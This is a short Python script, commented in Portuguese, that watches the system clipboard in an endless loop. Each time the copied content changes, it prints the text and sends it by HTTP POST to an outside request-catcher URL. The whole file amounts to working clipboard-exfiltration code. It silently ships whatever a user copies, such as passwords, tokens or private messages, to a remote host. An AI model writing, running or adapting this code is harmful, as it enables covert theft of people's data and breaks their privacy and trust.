

import pyperclip
import requests


# Variável para armazenar o conteúdo anterior da área de transferência
conteudo_anterior = ""

# Variaveis do request
url = 'https://mateus.requestcatcher.com/'
headers = {'Content-Type': 'text/plain; charset=utf-8'}



while True:
    # Verifica o conteúdo da área de transferência a cada segundo
    conteudo_atual = pyperclip.paste()

    # Se o conteúdo for diferente do conteúdo anterior
    if conteudo_atual != conteudo_anterior:
        # Imprime o conteúdo atual
        print("Conteúdo copiado para a área de transferência:")
        print(conteudo_atual)

        response = requests.post(url, data=conteudo_atual.encode('utf-8'), headers=headers)


        # Atualiza o conteúdo anterior
        conteudo_anterior = conteudo_atual


